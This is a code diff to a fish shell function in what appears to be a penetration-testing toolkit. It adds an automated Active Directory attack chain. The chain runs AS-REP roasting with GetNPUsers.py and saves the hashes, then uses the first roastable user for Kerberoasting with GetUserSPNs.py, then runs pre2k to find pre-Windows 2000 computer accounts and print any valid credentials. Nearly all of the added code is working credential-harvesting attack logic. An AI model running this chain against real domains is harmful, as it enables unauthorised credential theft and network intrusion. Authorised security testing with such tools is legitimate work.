@@ -201,5 +201,105 @@ Examples:
     # Cleanup temp file
     rm -f $shares_output
 
+    # Test for exploitable accounts if user files exist
+    set users_file_full "$target"_users.txt
+    set users_file_mini "$target"_users-mini.txt
+    if test -n "$domain"
+        set users_file_full "$domain"_users.txt
+        set users_file_mini "$domain"_users-mini.txt
+    end
+
+    set active_users_file ""
+    if test -f $users_file_full
+        set active_users_file $users_file_full
+    else if test -f $users_file_mini
+        set active_users_file $users_file_mini
+    end
+
+    if test -n "$active_users_file"
+        ezpz_title "Looking for exploitable accounts..."
+
+        ezpz_header "Searching for AS-REProastable accounts"
+        set asrep_file "$target"_asrep.hash
+        if test -n "$domain"
+            set asrep_file "$domain"_asrep.hash
+        end
+
+        # Build GetNPUsers command for null session
+        set getnpusers_cmd GetNPUsers.py "$domain/" -usersfile "$active_users_file" -dc-ip "$_flag_target"
+        if set -q _flag_kerb -a -n "$dc_fqdn"
+            set -a getnpusers_cmd -k -dc-host "$dc_fqdn"
+        end
+        
+        ezpz_cmd "$getnpusers_cmd"
+        set output ($getnpusers_cmd 2>&1)
+        set error_lines (string split '\n' $output | grep -E "(No entries found|KDC_ERR_|PREAUTH_FAILED)")
+        if test -n "$error_lines"
+            for line in $error_lines
+                echo $line | sed 's/^\[\-\] //'
+            end
+        else
+            echo $output | grep --color=never "\\S" | tail -n +4 | awk '{print $1}'
+            # Save hashes if any found
+            $getnpusers_cmd -request -outputfile $asrep_file >/dev/null 2>&1
+            if test -f $asrep_file
+                ezpz_info "Saving hashes to $asrep_file"
+                
+                # Extract first AS-REP roastable user for Kerberoasting
+                set asrep_user (head -1 $asrep_file | grep -oE '\$[^@]+@[^:]+' | cut -d'@' -f1 | cut -d'$' -f3)
+                if test -n "$asrep_user"
+                    ezpz_header "Searching for Kerberoastable accounts using AS-REP user"
+                    set kerb_file "$target"_kerb.hash
+                    if test -n "$domain"
+                        set kerb_file "$domain"_kerb.hash
+                    end
+                    
+                    set getuserspns_cmd GetUserSPNs.py "$domain/" -no-preauth "$asrep_user" -usersfile "$active_users_file" -dc-ip "$_flag_target"
+                    if set -q _flag_kerb -a -n "$dc_fqdn"
+                        set -a getuserspns_cmd -k -dc-host "$dc_fqdn"
+                    end
+                    
+                    ezpz_cmd "$getuserspns_cmd"
+                    set spn_output ($getuserspns_cmd 2>&1)
+                    set spn_error_lines (string split '\n' $spn_output | grep -E "(No entries found|KDC_ERR_|PREAUTH_FAILED)")
+                    if test -n "$spn_error_lines"
+                        for line in $spn_error_lines
+                            echo $line | sed 's/^\[\-\] //'
+                        end
+                    else
+                        echo $spn_output | grep --color=never "\\S" | tail -n +4 | awk '{print $2 " ||| "$1}' | column -s "|||" -t
+                        # Save hashes if any found
+                        $getuserspns_cmd -request -outputfile $kerb_file >/dev/null 2>&1
+                        if test -f $kerb_file
+                            ezpz_info "Saving hashes to $kerb_file"
+                        end
+                    end
+                end
+            end
+        end
+
+        # Test pre2k only if we have the full users file (not mini)
+        if test "$active_users_file" = "$users_file_full" -a -s "$active_users_file"
+            if command -v pre2k >/dev/null 2>&1
+                ezpz_header "Searching for pre-Win2k compatible computer accounts (NoPac)"
+                
+                # Build pre2k command
+                if set -q _flag_kerb -a -n "$dc_fqdn"
+                    set pre2k_cmd pre2k unauth -d "$domain" -dc-host "$dc_fqdn" -dc-ip "$_flag_target" -inputfile "$active_users_file" -k
+                    if set -q KRB5CCNAME
+                        set -a pre2k_cmd -no-pass
+                    end
+                else
+                    set pre2k_cmd pre2k unauth -d "$domain" -dc-ip "$_flag_target" -inputfile "$active_users_file"
+                end
+                
+                ezpz_cmd "$pre2k_cmd"
+                $pre2k_cmd 2>/dev/null | grep -ioE "VALID CREDENTIALS: .*" --color=never
+            else
+                ezpz_warn "pre2k not found. Skipping pre-Win2k computer account enumeration."
+            end
+        end
+    end
+
     ezpz_success "Done."
 end
